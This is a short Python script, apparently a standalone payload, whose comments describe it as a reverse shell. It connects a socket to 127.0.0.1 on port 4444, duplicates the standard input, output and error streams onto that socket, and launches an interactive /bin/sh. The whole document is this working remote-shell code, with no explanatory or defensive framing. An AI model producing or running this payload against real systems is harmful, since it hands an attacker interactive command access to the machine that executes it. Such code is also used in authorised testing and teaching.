import socket
import subprocess
import os

# create socket
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

# connect to listening server
s.connect(("127.0.0.1", 4444))

# invoke reverse shell
os.dup2(s.fileno(), 0)
os.dup2(s.fileno(), 1)
os.dup2(s.fileno(), 2)

proc = subprocess.call(["/bin/sh", "-i"])
